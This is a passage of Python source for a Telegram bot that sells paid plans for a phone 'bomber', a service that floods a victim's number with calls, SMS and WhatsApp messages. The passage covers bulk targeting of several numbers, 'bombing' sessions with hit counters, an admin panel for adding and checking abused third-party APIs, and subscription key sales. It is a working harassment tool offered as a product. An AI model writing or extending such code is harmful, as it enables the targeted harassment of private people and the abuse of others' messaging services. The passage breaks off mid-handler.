    sub = admin_db.get_subscription(chat_id)
    is_admin_user = chat_id in ADMIN_IDS or admin_db.is_admin(chat_id)
    
    msg = (
        f"👤 *Account Info*\n\n"
        f"🆔 ID: `{chat_id}`\n"
        f"👤 Name: {name}\n"
        f"📛 Username: @{user.username or 'N/A'}\n"
    )
    
    if is_admin_user:
        msg += f"\n👑 *Role: Admin* — Unlimited Access"
    elif sub:
        plan_emoji = {"standard": "🌟", "premium": "⭐", "vip": "👑", "daily": "📅", "monthly": "📆", "3month": "🗓️", "trial": "🎁"}.get(sub["plan"], "📋")
        expires = datetime.fromisoformat(sub["expires_at"])
        days_left = (expires - datetime.now()).days
        msg += (
            f"\n{plan_emoji} *Subscription Active*\n"
            f"📋 Plan: {sub['plan'].upper()}\n"
            f"📅 Expires: {expires.strftime('%d-%m-%Y')} ({days_left} days left)\n"
            f"⚡ Concurrent: {sub['max_concurrent']}\n"
            f"⏰ Max Hours: {sub['max_hours']}h"
        )
    else:
        msg += "\n❌ *No Active Subscription*\nUse /plans to buy or /redeem for key."
    
    status = bomber.get_status(chat_id)
    if status:
        msg += f"\n\n🔥 *Active Session:*\n📞 {status['phone']} | 🎯 {status['mode'].upper()}\n💣 Hits: {status['total']} | ⏱ {status['elapsed']}"
    
    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

@bot.message_handler(func=lambda m: m.text == "📋 Plans")
@join_channel_required
def btn_plans(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📅 Daily Plan - ₹40", callback_data="plan_daily"),
        types.InlineKeyboardButton("📆 Monthly Plan - ₹199", callback_data="plan_monthly"),
        types.InlineKeyboardButton("🗓️ 3-Month Plan - ₹499", callback_data="plan_3month"),
        types.InlineKeyboardButton("❓ Contact Admin", url=f"tg://user?id={ADMIN_IDS[0]}"),
    )
    bot.reply_to(message,
        "━━━ *PREMIUM SUBSCRIPTION PLANS* ━━━\n\n"
        "📅 *DAILY PLAN*\n"
        "├ 🏷️ Price: *₹40*\n"
        "├ ⏳ Validity: *1 Day*\n"
        "├ ⚡ Task Limit: *2 concurrent*\n"
        "├ ⏱️ Max Time: *2 hours/task*\n"
        "╰────────────────────────\n\n"
        "📆 *MONTHLY PLAN*\n"
        "├ 🏷️ Price: *₹199*\n"
        "├ ⏳ Validity: *30 Days*\n"
        "├ ⚡ Task Limit: *2 concurrent*\n"
        "├ ⏱️ Max Time: *8 hours/task*\n"
        "├ 📱 Multiple numbers support\n"
        "╰────────────────────────\n\n"
        "🗓️ *3-MONTH PLAN*\n"
        "├ 🏷️ Price: *₹499*\n"
        "├ ⏳ Validity: *90 Days*\n"
        "├ ⚡ Task Limit: *3 concurrent*\n"
        "├ ⏱️ Max Time: *24 hours/task*\n"
        "├ 📱 Three numbers support\n"
        "╰────────────────────────\n\n"
        "👇 *Click karein aur admin se contact karein:*",
        parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == "🎁 Redeem")
@join_channel_required
def btn_redeem(message):
    chat_id = message.chat.id
    sub = admin_db.get_subscription(chat_id)
    if sub:
        bot.reply_to(message,
            f"✅ *Aapke paas already active subscription hai!*\n\n"
            f"🎯 Plan: {sub['plan'].upper()}\n"
            f"⚡ Concurrent: {sub['max_concurrent']}\n"
            f"⏰ Max Hours: {sub['max_hours']}h",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return
    admin_data[chat_id] = {"action": "redeem_waiting"}
    bot.reply_to(message,
        "🎁 *Redeem Key*\n\n"
        "Apni key yahan bhejo:\n\n"
        "Jaise: `ABCD-EFGH-IJKL-MNOP`\n\n"
        "/cancel se cancel karo.",
        parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

@bot.message_handler(func=lambda m: m.text == "🎁 Free Trial")
@join_channel_required
def btn_trial(message):
    chat_id = message.chat.id
    if admin_db.is_banned(chat_id):
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*", parse_mode="Markdown")
        return
    success, msg = admin_db.start_trial(chat_id)
    bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

# ============================================================
# PLAN CALLBACKS
# ============================================================
@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("plan_"))
def plan_callback(call):
    chat_id = call.message.chat.id
    plan = call.data.replace("plan_", "")
    plan_names = {
        "daily": "📅 Daily - ₹40 (1 Day)",
        "monthly": "📆 Monthly - ₹199 (30 Days)",
        "3month": "🗓️ 3-Month - ₹499 (90 Days)"
    }
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💳 Buy Now", url=f"tg://user?id={ADMIN_IDS[0]}"),
        types.InlineKeyboardButton("❌ Close", callback_data="close_plan")
    )
    bot.edit_message_text(
        f"✅ *You selected: {plan_names.get(plan, plan)}*\n\n"
        f"Admin se contact karein aur payment karein.\n\n"
        f"Payment ke baad aapko key mil jayegi.",
        chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda c: c.data == "close_plan")
def close_plan_callback(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

# ============================================================
# HANDLE ALL MESSAGES
# ============================================================
EXCLUDED_FROM_FALLBACK = ["⚙️ Admin", "/cancel", "👤 Account", "📋 Plans", "🎁 Redeem", "🎁 Free Trial", "🛑 Stop", "📊 Status", "❓ Help", "🔥 MIX", "💥 Bulk MIX", "📞 CALL", "📱 WHATSAPP", "💬 SMS"]

@bot.message_handler(func=lambda m: (m.text or "") not in EXCLUDED_FROM_FALLBACK and m.chat.id not in admin_data)
@join_channel_required
@subscription_required
def handle_all(message):
    chat_id = message.chat.id
    text = message.text.strip()

    if admin_db.is_banned(chat_id) and chat_id not in ADMIN_IDS:
        bot.reply_to(message, "🚫 *Aapko ban kar diya gaya hai.*\n\nAdmin se contact karein.", parse_mode="Markdown")
        return

    user_data.users.setdefault(chat_id, {})
    username = message.from_user.username or message.from_user.first_name

    pending = user_data.users[chat_id].get("pending_mode")
    if pending == "bulk_mix_confirm":
        nums = [n.strip() for n in text.split(",") if n.strip()]
        valid_nums = [''.join(filter(str.isdigit, n))[-10:] for n in nums if len(''.join(filter(str.isdigit, n))) >= 10]
        if len(valid_nums) < 2:
            bot.reply_to(message,
                "❌ Kam se kam 2 valid numbers bhejo!\n\n"
                "Jaise: `9876543210, 9876543211, 9876543212`",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            return
        started = 0
        for n in valid_nums[:3]:
            s, m = bomber.start(chat_id, n, "mix", username=username)
            if s:
                started += 1
            time.sleep(1)
        del user_data.users[chat_id]["pending_mode"]
        bot.reply_to(message,
            f"💥 *Bulk MIX Started!*\n\n"
            f"✅ {started} numbers par bombing shuru!\n"
            f"📱 Numbers: {', '.join(valid_nums[:3])}\n\n"
            f"🛑 Admin panel se sab band kar sakte hain!",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return

    digits = ''.join(filter(str.isdigit, text))
    if len(digits) >= 10:
        phone = digits[-10:]
        user_data.users[chat_id]["phone"] = phone
        pending = user_data.users[chat_id].pop("pending_mode", None)
        if pending:
            success, msg = bomber.start(chat_id, phone, pending, username=username)
            bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        else:
            bot.reply_to(message,
                f"✅ Phone `{phone}` set ho gaya!\n\n"
                f"Ab mode select karo:\n"
                f"📞 Call | 💬 SMS | 📱 WhatsApp | 🔥 Mix",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return

    if "bomb" in text.lower() or "karo" in text.lower():
        nums = re.findall(r'\d{10,}', text)
        if nums:
            phone = nums[0][:10]
            user_data.users[chat_id]["phone"] = phone
            bot.reply_to(message,
                f"✅ Phone `{phone}` set! Ab mode select karo!",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            return

    bot.reply_to(message,
        "🤷 Kya karna chahte ho?\n\n"
        "1️⃣ Phone number bhejo (10-digit)\n"
        "2️⃣ Phir mode select karo buttons se\n"
        "3️⃣ Ya /start se shuru karo",
        reply_markup=main_keyboard(chat_id))

# ============================================================
# ADMIN CALLBACKS
# ============================================================
@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("admin_"))
def admin_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id

    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
        bot.answer_callback_query(call.id, "🚫 Access Denied!", show_alert=True)
        return

    action = call.data.replace("admin_", "")

    if action == "close":
        bot.delete_message(chat_id, msg_id)
        bot.answer_callback_query(call.id)
        return

    if action == "genkey":
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📅 Daily ₹40", callback_data="genkey_daily"),
            types.InlineKeyboardButton("📆 Monthly ₹199", callback_data="genkey_monthly"),
            types.InlineKeyboardButton("🗓️ 3-Month ₹499", callback_data="genkey_3month"),
            types.InlineKeyboardButton("🎯 Custom", callback_data="genkey_custom"),
            types.InlineKeyboardButton("❌ Back", callback_data="admin_refresh"),
        )
        bot.edit_message_text("🔑 *Generate Key*\n\nChoose plan type:", chat_id, msg_id, parse_mode="Markdown", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    if action == "viewkeys":
        keys = admin_db.get_all_keys()
        if not keys:
            bot.edit_message_text("❌ Koi key generate nahi hui abhi.", chat_id, msg_id)
            bot.answer_callback_query(call.id)
            return
        used_count = sum(1 for k in keys.values() if k["used"])
        msg = "🔐 *All Generated Keys*\n\n"
        msg += f"Total: {len(keys)} | Used: {used_count} | Unused: {len(keys)-used_count}\n\n"
        count = 0
        for key, k in sorted(keys.items(), key=lambda x: x[1]["created_at"], reverse=True):
            if count >= 8:
                msg += f"\n...aur {len(keys)-8} keys"
                break
            status = "✅ Used" if k["used"] else "🆕 New"
            plan_display = {"daily": "📅 Daily", "monthly": "📆 Monthly", "3month": "🗓️ 3M", "custom": "🎯 Custom"}.get(k["plan"], k["plan"])
            msg += f"`{key}` | {plan_display} | ₹{k['price']} | {status}\n"
            count += 1
        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "refresh":
        bot.edit_message_text(
            "⚙️ *Admin Panel*\n\n"
            f"👥 Total Users: {admin_db.get_user_count()}\n"
            f"🚫 Banned: {admin_db.get_banned_count()}\n"
            f"💣 Total Bombs: {admin_db.get_total_bombs()}\n"
            f"👑 Premium Users: {len(admin_db.get_premium_users())}\n\n"
            "✅ Refreshed!",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "stats":
        users = admin_db.get_all_users()
        total_hits = sum(u.get("total_hits", 0) for u in users.values())
        total_ok = sum(u.get("total_ok", 0) for u in users.values())
        total_fail = sum(u.get("total_fail", 0) for u in users.values())
        active_sessions = len(bomber.sessions)
        premium_users = len(admin_db.get_premium_users())
        api_stats = admin_db.get_api_stats()
        total_api_calls = sum(s.get("success", 0) + s.get("fail", 0) for s in api_stats.values())
        working_apis = sum(1 for s in api_stats.values() if s.get("success", 0) > 0)

        msg = (
            "📊 *Global Statistics*\n\n"
            f"👥 Total Users: {len(users)}\n"
            f"🚫 Banned: {admin_db.get_banned_count()}\n"
            f"👑 Premium Users: {premium_users}\n"
            f"🎯 Active Sessions: {active_sessions}\n"
            f"💣 Total Bombs: {admin_db.get_total_bombs()}\n"
            f"✅ Global OK: {total_ok}\n"
            f"❌ Global Fail: {total_fail}\n"
            f"📊 Global Hits: {total_hits}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📡 *API Stats*\n"
            f"📊 Total API Calls: {total_api_calls}\n"
            f"✅ Working APIs: {working_apis}\n"
            f"📋 Total APIs: {len(ALL_APIS)}"
        )
        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "users":
        users = admin_db.get_all_users()
        if not users:
            bot.edit_message_text("❌ Koi user nahi hai.", chat_id, msg_id)
            bot.answer_callback_query(call.id)
            return

        msg = f"👥 *All Users ({len(users)})*\n\n"
        count = 0
        premium_users = admin_db.get_premium_users()
        for uid, u in sorted(users.items(), key=lambda x: x[1].get("total_hits", 0), reverse=True):
            if count >= 10:
                msg += f"\n...aur {len(users) - 10} aur users"
                break
            name = u.get("username", "Unknown")
            phone = u.get("last_phone", "N/A")
            hits = u.get("total_hits", 0)
            mode = u.get("last_mode", "-")
            active = u.get("last_active", "")[:16].replace("T", " ")
            banned = "🚫" if admin_db.is_banned(int(uid)) else "✅"
            premium = "👑" if uid in premium_users else ""
            msg += f"{banned}{premium} `{uid}` @{name}\n📱 {phone} | 💣 {hits} | 🎯 {mode}\n⏱ {active}\n\n"
            count += 1

        if len(msg) > 4000:
            msg = msg[:3900] + "\n\n...aur bhi hai..."

        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "broadcast":
        admin_data[chat_id] = {"action": "broadcast_waiting"}
        bot.edit_message_text(
            "📢 *Broadcast Mode*\n\n"
            "Ab jo bhi message bhejoge, woh **SABHI USERS** ko bhej diya jayega.\n\n"
            "Ek text message bhejo. Cancel karne ke liye /cancel likho.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "addadmin":
        admin_data[chat_id] = {"action": "addadmin_waiting"}
        bot.edit_message_text(
            "➕ *Add Admin*\n\n"
            "Jis user ko admin banana hai uski **Telegram ID** bhejo.\n\n"
            "Example: `7812058540`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "removeadmin":
        admin_data[chat_id] = {"action": "removeadmin_waiting"}
        bot.edit_message_text(
            "➖ *Remove Admin*\n\n"
            "Jis user ko admin se hataana hai uski **Telegram ID** bhejo.\n\n"
            "Example: `7812058540`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "ban":
        admin_data[chat_id] = {"action": "ban_waiting"}
        bot.edit_message_text(
            "🚫 *Ban User*\n\n"
            "Jis user ko banana hai uski **Telegram ID** bhejo.\n\n"
            "Example: `123456789`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "unban":
        admin_data[chat_id] = {"action": "unban_waiting"}
        bot.edit_message_text(
            "✅ *Unban User*\n\n"
            "Jis user ko unban karna hai uski **Telegram ID** bhejo.\n\n"
            "Example: `123456789`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "premium_users":
        premium_users = admin_db.get_premium_users()
        if not premium_users:
            bot.edit_message_text("❌ Koi premium user nahi hai.", chat_id, msg_id)
            bot.answer_callback_query(call.id)
            return
        msg = "👑 *Premium Users*\n\n"
        for uid in premium_users:
            user = admin_db.data["users"].get(uid, {})
            name = user.get("username", "Unknown")
            sub = admin_db.get_subscription(int(uid))
            if sub:
                plan = sub.get("plan", "Unknown")
                expires = sub.get("expires_at", "N/A")[:10]
                msg += f"`{uid}` @{name} | {plan} | Exp: {expires}\n"
            else:
                msg += f"`{uid}` @{name} | No active sub\n"
        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "reset_premium":
        admin_data[chat_id] = {"action": "reset_premium_waiting"}
        bot.edit_message_text(
            "🔄 *Reset Premium*\n\n"
            "Jis user ka premium reset karna hai uski **Telegram ID** bhejo.\n\n"
            "Example: `123456789`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "api_check":
        api_stats = admin_db.get_api_stats()
        if not api_stats:
            bot.edit_message_text("❌ Abhi koi API call nahi hui.", chat_id, msg_id)
            bot.answer_callback_query(call.id)
            return
        
        working = []
        not_working = []
        for name, stats in sorted(api_stats.items(), key=lambda x: x[1].get("success", 0), reverse=True):
            total = stats.get("success", 0) + stats.get("fail", 0)
            if total == 0:
                continue
            success_rate = (stats.get("success", 0) / total) * 100
            if success_rate > 50:
                working.append(f"✅ {name}: {success_rate:.0f}%")
            else:
                not_working.append(f"❌ {name}: {success_rate:.0f}%")
        
        msg = "📡 *API Status Check*\n\n"
        msg += f"✅ Working: {len(working)}\n"
        msg += f"❌ Not Working: {len(not_working)}\n\n"
        if working[:10]:
            msg += "✅ Working APIs:\n" + "\n".join(working[:10]) + "\n"
        if not_working[:10]:
            msg += "\n❌ Not Working APIs:\n" + "\n".join(not_working[:10])
        
        bot.edit_message_text(msg, chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "add_api":
        admin_data[chat_id] = {"action": "add_api_waiting"}
        bot.edit_message_text(
            "➕ *Add API*\n\n"
            "API details bhejo in format:\n\n"
            "`name|url|method|headers|body|category`\n\n"
            "Example: `MyAPI|https://api.com|POST|Content-Type:application/json|{\"phone\":\"{phone}\"}|sms`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

    if action == "remove_api":
        admin_data[chat_id] = {"action": "remove_api_waiting"}
        bot.edit_message_text(
            "➖ *Remove API*\n\n"
            "API ka exact name bhejo jo remove karna hai.\n\n"
            "Example: `MyAPI`\n\n"
            "/cancel se cancel karo.",
            chat_id, msg_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return

# ============================================================
# GENKEY CALLBACKS
# ============================================================
@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("genkey_"))
def genkey_callback(call):
    chat_id = call.message.chat.id
    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
        bot.answer_callback_query(call.id, "🚫 Access Denied!", show_alert=True)
        return
    
    plan = call.data.replace("genkey_", "")
    
    if plan == "custom":
        admin_data[chat_id] = {"action": "custom_key_waiting"}
        bot.edit_message_text(
            "🎯 *Custom Key*\n\n"
            "Kitne din ki key chahiye? (Number bhejo)\n\n"
            "Example: `15` (15 din ki key)\n\n"
            "/cancel se cancel karo.",
            chat_id, call.message.message_id, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
        return
    
    key = admin_db.generate_key(plan, str(chat_id))
    plan_names = {"daily": "📅 Daily ₹40", "monthly": "📆 Monthly ₹199", "3month": "🗓️ 3-Month ₹499"}
    bot.edit_message_text(
        "✅ *Key Generated!*\n\n"
        f"Plan: {plan_names.get(plan, plan)}\n"
        f"Key: `{key}`\n\n"
        "Yeh key abhi ek baar use hogi. User redeem karega toh activate ho jayega.",
        chat_id, call.message.message_id, parse_mode="Markdown")
    bot.answer_callback_query(call.id, f"✅ Key generated: {key}", show_alert=True)

# ============================================================
# CHECK JOINED CALLBACK
# ============================================================
@bot.callback_query_handler(func=lambda c: c.data == "check_joined")
def check_joined_callback(call):
    chat_id = call.message.chat.id
    if is_channel_member(chat_id):
        bot.answer_callback_query(call.id, "✅ Verified! Bot use kar sakte ho!", show_alert=True)
        bot.delete_message(chat_id, call.message.message_id)
        user = call.from_user
        name = f"{user.first_name} {user.last_name or ''}".strip()
        name_display = name if name else user.username or "User"
        welcome_msg = (
            f"🛰️ *SYSTEM GATEWAY* 🛰️\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 User: {name_display} (ID: {chat_id})\n\n"
            f"👋 Welcome to the Bot!\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ *No Active Subscription Detected*\n\n"
            f"You do not have an active plan currently assigned to your account.\n\n"
            f"🎟️ *To Subscribe:*\n"
            f"▫️ Use /plans to view pricing & purchase\n"
            f"▫️ Use /redeem to activate using a code\n\n"
            f"💡 *We are ready when you are!*"
        )
        try:
            bot.send_photo(chat_id, WELCOME_IMAGE, caption=welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        except:
            bot.send_message(chat_id, welcome_msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return
    
    admin_db.verify_user(chat_id)
    bot.answer_callback_query(call.id, "✅ Manually verified! Bot use kar sakte ho!", show_alert=True)
    bot.delete_message(chat_id, call.message.message_id)
    bot.send_message(chat_id,
        "✅ *Manually verified!* Ab aap bot use kar sakte hain.",
        parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

# ============================================================
# STOP BOMBING CALLBACK
# ============================================================
@bot.callback_query_handler(func=lambda c: c.data == "stop_bombing")
def stop_bombing_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    with bomber.lock:
        if chat_id in bomber.sessions:
            success, msg = bomber.stop(chat_id)
            bot.edit_message_text(f"🛑 *Stopped!* ✅\n\n{msg}", chat_id, msg_id, parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "❌ No active session!", show_alert=True)
    bot.answer_callback_query(call.id)

# ============================================================
# GOTO CALLBACKS
# ============================================================
@bot.callback_query_handler(func=lambda c: c.data in ["goto_plans", "goto_redeem"])
def goto_callback(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    if call.data == "goto_plans":
        bot.delete_message(chat_id, msg_id)
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("📅 Daily - ₹40", url=f"tg://user?id={ADMIN_IDS[0]}"),
            types.InlineKeyboardButton("📆 Monthly - ₹199", url=f"tg://user?id={ADMIN_IDS[0]}"),
            types.InlineKeyboardButton("🗓️ 3-Month - ₹499", url=f"tg://user?id={ADMIN_IDS[0]}"),
        )
        bot.send_message(chat_id,
            "━━━ *PREMIUM SUBSCRIPTION PLANS* ━━━\n\n"
            "📅 *DAILY*\n├ ₹40 | 1 Day | 2 concurrent | 2h\n\n"
            "📆 *MONTHLY*\n├ ₹199 | 30 Days | 2 concurrent | 8h\n\n"
            "🗓️ *3-MONTH*\n├ ₹499 | 90 Days | 3 concurrent | 24h\n\n"
            "👇 Admin se contact karein:",
            parse_mode="Markdown", reply_markup=markup)
    elif call.data == "goto_redeem":
        bot.delete_message(chat_id, msg_id)
        admin_data[chat_id] = {"action": "redeem_waiting"}
        bot.send_message(chat_id,
            "🎁 *Redeem Key*\n\nApni key yahan bhejo:\n\nJaise: `ABCD-EFGH-IJKL-MNOP`\n\n/cancel se cancel karo.",
            parse_mode="Markdown")

# ============================================================
# ADMIN PANEL BUTTON
# ============================================================
@bot.message_handler(func=lambda m: m.text == "⚙️ Admin")
def btn_admin_panel(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS and not admin_db.is_admin(chat_id):
        bot.reply_to(message, "🚫 *Access Denied!* Sirf admin ke liye.", parse_mode="Markdown")
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("👥 Users", callback_data="admin_users"),
        types.InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
        types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("➕ Add Admin", callback_data="admin_addadmin"),
        types.InlineKeyboardButton("➖ Remove Admin", callback_data="admin_removeadmin"),
        types.InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban"),
        types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban"),
        types.InlineKeyboardButton("🔑 Gen Key", callback_data="admin_genkey"),
        types.InlineKeyboardButton("🔐 View Keys", callback_data="admin_viewkeys"),
        types.InlineKeyboardButton("👑 Premium Users", callback_data="admin_premium_users"),
        types.InlineKeyboardButton("🔄 Reset Premium", callback_data="admin_reset_premium"),
        types.InlineKeyboardButton("📡 API Check", callback_data="admin_api_check"),
        types.InlineKeyboardButton("➕ Add API", callback_data="admin_add_api"),
        types.InlineKeyboardButton("➖ Remove API", callback_data="admin_remove_api"),
        types.InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"),
        types.InlineKeyboardButton("❌ Close", callback_data="admin_close"),
    )
    bot.reply_to(message,
        "⚙️ *Admin Panel*\n\n"
        f"👥 Total Users: {admin_db.get_user_count()}\n"
        f"🚫 Banned: {admin_db.get_banned_count()}\n"
        f"💣 Total Bombs: {admin_db.get_total_bombs()}\n"
        f"👑 Premium Users: {len(admin_db.get_premium_users())}\n\n"
        "Chooze karein:",
        parse_mode="Markdown", reply_markup=markup)

# ============================================================
# ADMIN TEXT INPUT HANDLERS
# ============================================================
@bot.message_handler(func=lambda m: admin_data.get(m.chat.id, {}).get("action") in [
    "broadcast_waiting", "addadmin_waiting", "removeadmin_waiting", 
    "ban_waiting", "unban_waiting", "redeem_waiting", 
    "custom_key_waiting", "add_api_waiting", "remove_api_waiting",
    "reset_premium_waiting"
])
def handle_admin_input(message):
    chat_id = message.chat.id
    action = admin_data[chat_id]["action"]
    text = message.text.strip()

    if text == "/cancel":
        del admin_data[chat_id]
        bot.reply_to(message, "❌ Cancelled.", reply_markup=main_keyboard(chat_id))
        return

    if action == "redeem_waiting":
        success, msg = admin_db.redeem_key(text.strip().upper(), chat_id)
        del admin_data[chat_id]
        bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        return

    if action == "broadcast_waiting":
        users = admin_db.get_all_users()
        sent = 0
        failed = 0
        for uid in users:
            try:
                bot.send_message(int(uid),
                    f"📢 *Broadcast from Admin*\n\n{text}\n\n— *Admin*",
                    parse_mode="Markdown")
                sent += 1
            except:
                failed += 1
        del admin_data[chat_id]
        admin_db.data["broadcasts"] = admin_db.data.get("broadcasts", 0) + 1
        admin_db._save()
        bot.reply_to(message,
            f"📢 *Broadcast Complete!*\n\n"
            f"✅ Sent: {sent}\n"
            f"❌ Failed: {failed}\n"
            f"👥 Total Users: {len(users)}",
            parse_mode="Markdown", reply_markup=main_keyboard(chat_id))

    elif action == "addadmin_waiting":
        try:
            target_id = int(text)
            if target_id in ADMIN_IDS:
                bot.reply_to(message, "❌ Yeh toh Super Admin hai already!", reply_markup=main_keyboard(chat_id))
            elif admin_db.add_admin(target_id, chat_id):
                bot.reply_to(message, f"✅ User `{target_id}` ko Admin banaya gaya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Pehle se hi admin hai!", reply_markup=main_keyboard(chat_id))
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID! Sirf numeric ID bhejo.", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "removeadmin_waiting":
        try:
            target_id = int(text)
            if target_id in ADMIN_IDS:
                bot.reply_to(message, "❌ Super Admin ko nahi hata sakte!", reply_markup=main_keyboard(chat_id))
            elif admin_db.remove_admin(target_id):
                bot.reply_to(message, f"✅ User `{target_id}` ko Admin se hata diya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Yeh user admin nahi hai!", reply_markup=main_keyboard(chat_id))
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID!", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "ban_waiting":
        try:
            target_id = int(text)
            if target_id in ADMIN_IDS:
                bot.reply_to(message, "❌ Super Admin ko ban nahi kar sakte!", reply_markup=main_keyboard(chat_id))
            elif admin_db.ban_user(target_id, chat_id):
                bomber.stop(target_id)
                bot.reply_to(message, f"🚫 User `{target_id}` ko ban kar diya gaya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Pehle se banned hai!", reply_markup=main_keyboard(chat_id))
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID!", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "unban_waiting":
        try:
            target_id = int(text)
            if admin_db.unban_user(target_id, chat_id):
                bot.reply_to(message, f"✅ User `{target_id}` ko unban kar diya gaya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Yeh user banned nahi hai!", reply_markup=main_keyboard(chat_id))
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID!", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "custom_key_waiting":
        try:
            days = int(text)
            if days < 1 or days > 365:
                bot.reply_to(message, "❌ Days 1 se 365 ke beech me hona chahiye!", reply_markup=main_keyboard(chat_id))
                del admin_data[chat_id]
                return
            key = admin_db.generate_key("custom", str(chat_id), custom_days=days)
            bot.reply_to(message,
                f"✅ *Custom Key Generated!*\n\n"
                f"🎯 Plan: Custom ({days} days)\n"
                f"Key: `{key}`\n\n"
                f"Yeh key {days} din ki validity ke saath generate hui hai.",
                parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
        except ValueError:
            bot.reply_to(message, "❌ Invalid number! Sirf number bhejo.", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "reset_premium_waiting":
        try:
            target_id = int(text)
            if target_id in ADMIN_IDS:
                bot.reply_to(message, "❌ Super Admin ka premium reset nahi kar sakte!", reply_markup=main_keyboard(chat_id))
            elif admin_db.reset_premium(target_id):
                bot.reply_to(message, f"🔄 User `{target_id}` ka premium reset kar diya gaya!", parse_mode="Markdown", reply_markup=main_keyboard(chat_id))
            else:
                bot.reply_to(message, "❌ Yeh user premium nahi hai!", reply_markup=main_keyboard(chat_id))
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID!", reply_markup=main_keyboard(chat_id))
        del admin_data[chat_id]

    elif action == "add_api_waiting":
        try:
            parts = text.split("|")
            if len(parts) < 5:
                bot.reply_to(message, "❌ Invalid format! Use: `name|url|method|headers|body|category`", reply_markup=main_keyboard(chat_id))
